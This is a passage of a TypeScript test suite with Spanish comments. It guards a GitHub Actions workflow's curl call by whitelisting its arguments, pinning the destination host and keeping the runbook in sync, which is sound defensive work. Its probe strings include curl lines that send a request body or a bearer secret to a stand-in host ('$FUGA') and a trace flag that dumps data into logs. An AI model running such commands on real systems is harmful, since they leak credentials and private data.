    expect(YAML).toMatch(/^\s+timeout-minutes:\s*\d+/m);
  });

  // ── AC-B8 — el runbook, y que sea VISIBLE en el repo publico ────────────────────────────────
  it("T-042B-12: el runbook existe y esta whitelisteado en .gitignore", () => {
    expect(existsSync(path.join(ROOT, RUNBOOK_REL)), `falta ${RUNBOOK_REL}`).toBe(true);
    expect(RUNBOOK.length).toBeGreaterThan(500);
    // `docs/*` esta ignorado y solo se rescatan archivos nombrados a mano: sin esta linea el runbook
    // queda en el disco y FUERA del repo, o sea invisible para quien revisa este repo publico.
    expect(GITIGNORE.split("\n")).toContain(`!${RUNBOOK_REL}`);
  });

  it("T-042B-13: el runbook no afirma que una fila prepared implique que no hubo deposito", () => {
    // 🔴 BARRIDO POR TEXTO COMPLETO, NUNCA POR LINEA: medido en este repo, la frase cruzaba el salto
    // de linea y el barrido por linea daba 0 hits con la frase falsa intacta.
    const hits = [...RUNBOOK.matchAll(CLAIM_RE)].map((m) => m[0].replace(/\s+/g, " "));
    expect(hits).toEqual([]);
    // Control de no-vacuidad: si el regex dejara de matchear la frase que persigue, el `[]` de
    // arriba no diria nada. prepared-claims-guard NO mira `.md`, asi que aca no hay otra red.
    const sonda = "una fila prepared dice que su principal nunca entro";
    expect([...sonda.matchAll(CLAIM_RE)]).toHaveLength(1);
    for (const neg of NEGACIONES) {
      expect([...`el principal ${neg} entro`.matchAll(CLAIM_RE)]).toHaveLength(1);
    }
  });

  it("T-042B-14: la cadencia del runbook y de .env.example es la MISMA string que el cron del YAML", () => {
    // Fuente unica: el cron sale del YAML, no de una copia escrita en este test.
    expect(CRON, "no se pudo leer el `cron:` del workflow").not.toBe("");
    expect(RUNBOOK.includes(CRON), `el runbook no declara la cadencia ${CRON}`).toBe(true);
    expect(ENV_EXAMPLE.includes(CRON), `.env.example no declara la cadencia ${CRON}`).toBe(true);
  });

  // ── AC-B2 · AC-B3 · AC-B6 · CD-10 — el argv del curl y el DESTINO del secreto ────────────────
  it("T-042B-15: el argv del curl es una LISTA BLANCA, y el destino del secreto esta fijado", () => {
    // ⚠️ `${VAR}` escrito de corrido dentro de una cadena de TS lo marca biome con
    // lint/suspicious/noTemplateCurlyInString, asi que se arma partido, igual que el literal prohibido
    // de T-042B-10. Lo que se compara es el TEXTO, no la sintaxis del template.
    const VAR_SECRETO = `$${"{RECONCILE_ADMIN_SECRET}"}`;
    const VAR_URL = `$${"{RECONCILE_URL}"}`;
    const HEADER = `authorization: Bearer ${VAR_SECRETO}`;

    // 🔴 EL BARRIDO CORRE SOBRE LOS `run:` DE TODOS LOS PASOS, NO SOBRE L1. Es el bloqueante del F4, y
    // el input es exacto: `curl -sS -X POST --data-binary @body.json "<otro host>"` insertado en el
    // SEGUNDO paso —el que sube `body.json`, con los remittanceId / quoteId / payoutId de remesas
    // REALES, a un destino elegido— pasaba 17/17 EN VERDE, mientras que el MISMO comando en L1 moria.
    // La lista blanca estaba escrita y era correcta; lo que estaba mal era DONDE se la corria. Un
    // perimetro que dice "cada `curl` del paso" y se aplica a un solo paso no es un limite declarado:
    // es una afirmacion falsa. Se deriva de `PASOS` (no de L1/L2 escritos a mano) para que un tercer
    // paso entre al barrido solo — aunque hoy T-042B-0 exige exactamente dos.
    const INVOCACIONES = PASOS.map((p, i) => ({ paso: `L${i + 1}`, argvs: argvsDelCurl(p.run) }));
    const argvs = argvsDelCurl(L1);
    expect(argvs, "L1 no tiene ningun `curl`").not.toEqual([]);
    // El `curl` que manda el POST es el primero; la direccion de los OBLIGATORIOS va contra ese.
    const argv = argvs[0] as readonly string[];

    // 🔴 LISTA BLANCA DEL ARGV. Cualquier token que no este enumerado es rojo. `--trace-ascii
    // /dev/stdout` —que publica el cuerpo entero en el log de un repo publico sin tocar `body.json`—
    // muere aca, y muere por NO ESTAR EN LA LISTA, no por estar en una lista negra que alguien tuvo que
    // imaginar. Lo mismo cualquier `--output`, `-v`, `--trace`, `-D`, `--data-binary` o un segundo `-H`.
    const ARGV_PERMITIDO: readonly (string | RegExp)[] = [
      "curl",
      "-sS",
      "-X",
      "POST",
      "--max-time",
      /^[0-9]+$/,
      "-H",
      HEADER,
      "-o",
      "body.json",
      "-w",
      "%{http_code}",
      VAR_URL,
    ];
    // 🔴 SOBRE CADA INVOCACION DE CADA PASO, no sobre la primera de L1. Dos agujeros medidos, uno por
    // ronda, los dos con 17/17 EN VERDE:
    //   · el CR: un SEGUNDO `curl` con el mismo `authorization: Bearer` apuntando a otro host, que el
    //     lector no veia porque hacia `findIndex` (arreglado en `argvsDelCurl`);
    //   · el F4: un `curl --data-binary @body.json` en el SEGUNDO paso, que el lector SI veia pero al
    //     que nadie le corria la lista blanca, porque el barrido decia `argvsDelCurl(L1)`.
    // Un token que no este enumerado es rojo, venga del `curl` que sea y del paso que sea.
    for (const { paso, argvs: delPaso } of INVOCACIONES) {
      for (const [k, uno] of delPaso.entries()) {
        for (const t of uno) {
          const permitido = ARGV_PERMITIDO.some((p) => (typeof p === "string" ? p === t : p.test(t)));
          expect(
            permitido,
            `token del curl #${k + 1} de ${paso} que no esta en la lista blanca del candado: '${t}'`,
          ).toBe(true);
        }
      }
    }
    // 🔴 Y QUE EL BARRIDO NO SE HAYA DEJADO NINGUNA INVOCACION AFUERA. Sin esto, volver el barrido a un
    // solo paso es una edicion de una linea que nadie ve. El cruce es contra `SHELL` —o sea, contra
    // TODO lo que el workflow ejecuta— y por otro camino: contar las lineas que INVOCAN `curl`. Si el
    // barrido de arriba mira menos pasos de los que existen, los dos numeros dejan de coincidir en
    // cuanto haya un `curl` fuera de ese paso, que es exactamente el caso que abrio el agujero.
    // ⚠️ LO QUE ESTE CRUCE NO PRUEBA, dicho: comparte `CURL_INVOCACION` con el lector, asi que si ese
    // regex dejara de reconocer una invocacion, los dos lados la perderian igual. Cubre el ALCANCE del
    // barrido, no el CRITERIO — el criterio lo fijan las dos sondas de mas abajo.
    const lineasQueInvocanCurl = SHELL.split("\n").filter((l) => CURL_INVOCACION.test(l)).length;
    const escaneadas = INVOCACIONES.reduce((n, x) => n + x.argvs.length, 0);
    expect(lineasQueInvocanCurl, "el workflow no invoca `curl` en ninguna linea").toBeGreaterThan(0);
    expect(
      escaneadas,
      "la lista blanca no se corrio sobre todas las invocaciones de `curl` del workflow: hay una fuera del barrido",
    ).toBe(lineasQueInvocanCurl);
    // ⚠️ CALIBRACION DEL CRUCE, EN LAS DOS DIRECCIONES, sobre un par sintetico que reproduce el input del
    // F4: dos pasos, el `curl` en el SEGUNDO. Sin esto el cruce podria ser `0 === 0` sobre nada y no
    // decir nada. Barrer solo el primer paso da 0 mientras el texto completo tiene 1 ⇒ el cruce se pone
    // ROJO; barrer los dos da 1 = 1 ⇒ verde.
    const sondaPasos = ["set -euo pipefail\n echo hola", 'curl -sS -X POST --data-binary @body.json "$FUGA"'];
    const sondaLineas = sondaPasos.join("\n").split("\n").filter((l) => CURL_INVOCACION.test(l)).length;
    expect(sondaLineas, "la sonda del cruce no tiene ninguna invocacion que contar").toBe(1);
    expect(
      argvsDelCurl(sondaPasos[0] as string).length,
      "barrer solo el primer paso NO puede ver el `curl` del segundo: si lo viera, el cruce no probaria nada",
    ).toBe(0);
    expect(sondaPasos.reduce((n, r) => n + argvsDelCurl(r).length, 0)).toBe(sondaLineas);
    // Y LA OTRA DIRECCION: la lista blanca sola no impide BORRAR una bandera necesaria. Medido: sin
    // `--max-time 60` el techo del curl pasa de 60 s a los 5 min del `timeout-minutes`, y el runbook
    // —que afirma los 60 s— queda desactualizado en silencio.
    for (const req of ["-sS", "-X", "POST", "--max-time", "-H", HEADER, "-o", "body.json", "-w", "%{http_code}", VAR_URL]) {
      expect(argv, `al curl le falta un argumento obligatorio: ${req}`).toContain(req);
    }
    // 🔴 EL VALOR DEL TECHO, NO SOLO LA BANDERA — y cruzado con el runbook, igual que el host. Medido por
    // el CR: `--max-time 60` → `600` SOBREVIVIA en verde, porque la lista blanca acepta `/^[0-9]+$/`
    // (cualquier entero) y la direccion de los obligatorios exige el FLAG, no el valor. Y el runbook
    // afirmaba que "el `--max-time 60` no es solo una afirmacion de este documento: el candado corre una
    // lista blanca", que era FALSO: el candado respaldaba la bandera y el numero quedaba libre. Con esto,
    // subir el techo sin tocar el runbook pone la suite roja — y borrar el VALOR dejando la bandera
    // tambien (medido: `--max-time` sin numero tambien sobrevivia).
    // ⚠️ EL NUMERO NO SE HARDCODEA ACA A PROPOSITO. Escrito en este archivo serian dos copias de lo mismo
    // y el cruce con el runbook seguiria abierto. Se DERIVA del argv y se exige que el runbook —otro
    // archivo, que lee un humano— declare el mismo: subir el techo obliga a tocar los dos, que es
    // exactamente lo que se quiere que se revise. Es el mismo patron que el del host.
    // ⚠️ Y EL `\b` NO ES DECORATIVO, medido: sin el, un techo de `6` matchearia DENTRO del `--max-time 60`
    // del runbook y ese mutante sobreviviria.
    const techo = argv[argv.indexOf("--max-time") + 1] ?? "";
    expect(techo, "no se pudo derivar el valor de `--max-time` del argv del curl").toMatch(/^[0-9]+$/);
    expect(
      new RegExp(`--max-time ${techo}\\b`).test(RUNBOOK),
      `el runbook no declara el techo del curl: falta \`--max-time ${techo}\``,
    ).toBe(true);

    // ⚠️ CALIBRACION DEL LECTOR, EN LAS DOS DIRECCIONES. Sin esto, un `argvDelCurl` con un bug propio
    // (devolver [] o perder los tokens) haria que las dos listas de arriba aplaudan sobre nada.
    expect(tokens('curl -H "authorization: Bearer x" -o body.json')).toEqual([
      "curl",
      "-H",
      "authorization: Bearer x",
      "-o",
      "body.json",
    ]);
    expect(
      argvsDelCurl('if ! code="$(curl -sS --trace-ascii /dev/stdout \\\n            "$U")"; then')[0] ?? [],
      "la sonda negativa: si el lector no ve la bandera, la lista blanca no protege nada",
    ).toContain("--trace-ascii");
    // ⚠️ CALIBRACION DEL BARRIDO DE INVOCACIONES, EN LAS DOS DIRECCIONES. Es el arreglo de esta ronda, y
    // las dos sondas son el par exacto que hay que fijar:
    //   · que vea el SEGUNDO `curl` (con `findIndex` no lo veia, y el secreto salia a otro host en verde);
    //   · y que NO cuente la palabra `curl` dentro de un mensaje `::error`. Ese mensaje EXISTE en este
    //     workflow ("el curl no completo"), asi que contarlo seria un falso ROJO con el .yml correcto.
    expect(
      argvsDelCurl('curl -sS "$A"\ncurl -sS -H "authorization: Bearer $S" "$FUGA"'),
      "el lector tiene que ver TODAS las invocaciones de `curl`, no la primera",
    ).toHaveLength(2);
    expect(
      argvsDelCurl(
        '          echo "::error title=transporte (L1)::el curl -sS --trace-ascii /dev/stdout no completo (timeout de 60s)"',
      ),
      "un `curl` MENCIONADO en un mensaje no es una invocacion: contarlo pone la suite roja con el workflow correcto",
    ).toEqual([]);

    // 🔴 EL DESTINO, CRUZADO CON DOS FUENTES INDEPENDIENTES DEL PROPIO CURL. Medido por el AR: cambiar
    // el host de la URL a otro dominio —una edicion de UN renglon— mandaba el
    // `authorization: Bearer <secreto de administracion de produccion>` a ese dominio, y la suite
    // aprobaba 15/15. Es el hallazgo mas grave de las tres rondas y no dependia de ningun test: el
    // arreglo de fondo esta en el `.yml` (compara el host contra la lista blanca ANTES del curl y corta
    // sin mandar nada). Esto lo cruza con el arbol de la app y con el runbook.
    const urls = urlsDe(L1);
    expect(urls, "el paso L1 tiene que tener EXACTAMENTE una URL escrita").toHaveLength(1);
    const destino = urls[0] as string;
    expect(destino.startsWith("https://"), `el destino no es https: ${destino}`).toBe(true);
    const host = (destino.replace("https://", "").split("/")[0] as string) ?? "";
    expect(host, "no se pudo derivar el host del destino").not.toBe("");
    // 1. el propio `.yml` se niega a mandar el secreto a otro host: el literal de la lista blanca del
    //    shell tiene que ser EL MISMO host que el de la URL.
    expect(
      L1.includes(`HOST_PERMITIDO="${host}"`),
      `el workflow no fija el host antes del curl: falta HOST_PERMITIDO="${host}"`,
    ).toBe(true);
    expect(L1, "el workflow no compara el host contra HOST_PERMITIDO antes del curl").toMatch(
      /"\$\{host\}"\s*!=\s*"\$\{HOST_PERMITIDO\}"/,
    );
    // 🔴 Y EL ORDEN, QUE ES LO QUE HACE QUE LA GUARDA SIRVA. Es el hallazgo del CR de esta ronda: con
    // exigir solo que el literal y la comparacion EXISTIERAN —en cualquier lugar del `run:`— mover el
    // bloque `esquema=` … `fi` a DESPUES del `curl` pasaba 17/17 EN VERDE. Y en ese .yml el
    // `authorization: Bearer <el secreto de administracion de produccion>` YA SALIO cuando el paso imprime
    // "El secreto de administracion NO se envio": la anotacion se vuelve una afirmacion FALSA emitida por
    // el propio workflow. La forma es la misma que la del chequeo de secreto vacio en T-042B-8
    // (`indexOf("-z ") < indexOf("curl")`), que existia para la guarda hermana y no para esta.
    // ⚠️ VA SOBRE LA COMPARACION Y NO SOBRE EL LITERAL `HOST_PERMITIDO="…"`, y no es un detalle de estilo:
    // medido, el mutante deja la ASIGNACION donde estaba y mueve solo las lineas de la comparacion, asi
    // que un `indexOf('HOST_PERMITIDO="…"') < indexOf("curl")` lo habria aprobado igual.
    // ⚠️ Y EL `curl` SE UBICA POR POSICION DE COMANDO (`CURL_INVOCACION`), no con `indexOf("curl")`. LA
    // RAZON QUE ESTABA ESCRITA ACA ERA FALSA y la corrigio el F4 midiendola: decia que con `indexOf`
    // "alcanzaria con mencionar `curl` mas arriba para que la comparacion pareciera antes del curl", o
    // sea que describia un falso VERDE. Ese escape NO EXISTE, y la aritmetica dice por que: mencionar
    // `curl` mas arriba mueve el ancla hacia ATRAS, lo que vuelve la asercion MAS dificil de pasar, nunca
    // mas facil. Medido sobre el mutante que importa (la guarda de host movida a DESPUES del curl):
    // con el localizador degradado a `includes("curl")` MUERE, y con la mencion agregada mas arriba
    // MUERE tambien, con un numero mas chico del lado derecho.
    // LA RAZON VERDADERA, y por que la eleccion sigue siendo la correcta, son dos y van en direcciones
    // distintas:
    //   · en una asercion de ORDEN, el localizador ingenuo produce FALSOS ROJOS con el workflow correcto
    //     (es el input `J1` del F4 sobre la guarda hermana de T-042B-8, medido: `expected 107 to be less
    //     than 63`), y un falso rojo con el workflow bien es lo que empuja a relajar el patron;
    //   · en el LECTOR de la lista blanca la direccion peligrosa aparece al reves y esta medida: volver
    //     `CURL_INVOCACION` al `/\bcurl\b/` ingenuo pone ROJO el `.yml` CORRECTO, porque el mensaje del
    //     `::error` de transporte contiene la palabra `curl` y el lector lo tomaria por una invocacion
    //     (mutante `I1`: 16/17, `token del curl #2 … 'no'`).
    const lineasL1 = L1.split("\n");
    const iGuarda = lineasL1.findIndex((l) => /"\$\{host\}"\s*!=\s*"\$\{HOST_PERMITIDO\}"/.test(l));
    const iCurl = lineasL1.findIndex((l) => CURL_INVOCACION.test(l));
    expect(iGuarda, "no se encontro la comparacion de host en ninguna linea de L1").toBeGreaterThan(-1);
    expect(iCurl, "no se encontro ninguna INVOCACION de curl en L1").toBeGreaterThan(-1);
    expect(
      iGuarda,
      "la comparacion del host corre DESPUES del curl: cuando el paso dice que el secreto no se envio, ya salio",
    ).toBeLessThan(iCurl);
    // 2. y el runbook —otro archivo, que un humano lee— declara el MISMO host. Cambiar el destino de
    //    verdad exige tocar los dos archivos, que es exactamente lo que se quiere que se revise.
    expect(RUNBOOK.includes(host), `el runbook no declara el host de destino ${host}`).toBe(true);
    // 3. la RUTA sale del arbol de la app y no de una copia escrita aca: si el endpoint se mueve, el
    //    destino del cron tiene que moverse con el.
    const ruta = `/${ROUTE_REL.replace("app/", "").replace("/route.ts", "")}`;
    expect(destino, "el destino no es el endpoint que esta en el arbol de la app").toBe(
      `https://${host}${ruta}`,
    );
  });

  // ── Calibracion de los lectores de este archivo ──────────────────────────────────────────────
  it("T-042B-16: el despojador de comentarios, calibrado en las DOS direcciones", () => {
    // 🔴 LA DIRECCION PELIGROSA (falso verde): un comentario EN LINEA que nombre `-o body.json` no
    // puede satisfacer la asercion que exige que el `-o` este en el `curl`. Medido con el `-o` borrado:
    // pasaba 2801/2801, y el cuerpo con IDs de remesas reales salia al log publico.
    expect(sinComentarios('  echo "transporte OK"  # el cuerpo ya no va a -o body.json')).toBe(
      '  echo "transporte OK"',
    );
    // 🔴 LA DIRECCION DEL FALSO ROJO: un comentario en linea que nombre una prohibicion no puede poner
    // T-042B-10 rojo con el workflow correcto. Escribir ese comentario es una edicion legitima.
    expect(sinComentarios('  echo "sin hallazgos"  # nunca cat body.json').includes("cat body.json")).toBe(
      false,
    );
    // Y el comentario de linea completa sigue saliendo entero (no queda una linea con basura).
    expect(sinComentarios("    # solo un comentario\n    echo hola")).toBe("    echo hola");
    // ⚠️ LO QUE NO SE PUEDE TOCAR, que es la razon por la que esto no es un `split("#")[0]`: un `#`
    // dentro de comillas es DATO (el resumen del workflow escribe `### reconcile-orphans`), y un `#`
    // pegado a un nombre de variable es una EXPANSION del shell (el workflow saca el esquema de la URL
    // con una). Comerselos seria un falso rojo, o peor, cambiar lo que el candado cree que ejecuta.
    expect(sinComentarios('  echo "### reconcile-orphans # con numeral"')).toBe(
      '  echo "### reconcile-orphans # con numeral"',
    );
    expect(sinComentarios(`  host="$${"{RECONCILE_URL#*://}"}"`)).toBe(
      `  host="$${"{RECONCILE_URL#*://}"}"`,
    );
    // Y la calibracion de que el despojador NO es un no-op disfrazado: si `sinComentarioEnLinea`
    // devolviera siempre la linea entera, las dos primeras sondas fallarian; si devolviera siempre "",
    // fallarian las dos ultimas. Las cuatro juntas lo fijan.
  });
});
